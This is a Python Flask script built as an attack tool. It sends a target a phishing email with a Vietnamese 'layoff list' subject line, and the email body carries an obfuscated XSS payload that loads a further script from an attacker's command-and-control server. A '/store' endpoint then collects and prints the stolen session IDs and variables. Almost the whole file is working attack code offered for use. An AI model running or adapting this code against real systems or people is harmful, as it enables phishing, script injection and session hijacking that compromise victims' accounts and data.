import base64
import json
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from flask import Flask, request

app = Flask(__name__)

class Mail:
    def __init__(self, smtp_server, smtp_port, sender_email, sender_password, target_email):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.target_email = target_email

    def send_email(self, subject, message_body):
        mail_message = MIMEMultipart()
        mail_message["Subject"] = subject
        mail_message["From"] = self.sender_email
        mail_message["To"] = self.target_email
        message = MIMEText(message_body)
        mail_message.attach(message)
        try:
            smtp_server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            smtp_server.connect(self.smtp_server, self.smtp_port)
            smtp_server.ehlo()
            smtp_server.starttls()
            smtp_server.ehlo()
            smtp_server.login(self.sender_email, self.sender_password)
            smtp_server.sendmail(self.sender_email, self.target_email, mail_message.as_string())
        except smtplib.SMTPException:
            return False
        return True

def safe_b64decode(data):
    try:
        missing_padding = len(data) % 4
        if missing_padding:
            data += '=' * (4 - missing_padding)
        return base64.b64decode(data).decode("utf-8").strip("\r\n{}\t")
    except:
        return ""

@app.route("/store", methods=["POST"])
def store():
    body = request.get_data(as_text=True)
    data = json.loads(body)["data"]
    data = safe_b64decode(data)
    print("Exploit succeeded...")
    print(f"SESSID / VARS: {data}")
    return ""

@app.route("/error", methods=["POST"])
def error():
    return ""

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("smtp_server", type=str)
    parser.add_argument("smtp_port", type=str)
    parser.add_argument("sender_email", type=str)
    parser.add_argument("sender_password", type=str)
    parser.add_argument("target_email", type=str)
    parser.add_argument("c2_server", type=str) #ip:port localhost or app run
    args = parser.parse_args()
    js = f'var s=document.createElement("script");s.type="text/javascript";s.src="{args.c2_server}/static/x-fetch-sqli.js";document.head.append(s);'
    payload = f'[<script>eval(atob("{base64.b64encode(js.encode()).decode()}"))</script>]http://cbjs.io'
    Mail(args.smtp_server, args.smtp_port, args.sender_email, args.sender_password, args.target_email).send_email("Danh s√°ch layoff!", payload)
    app.run(host="0.0.0.0", port=8181)
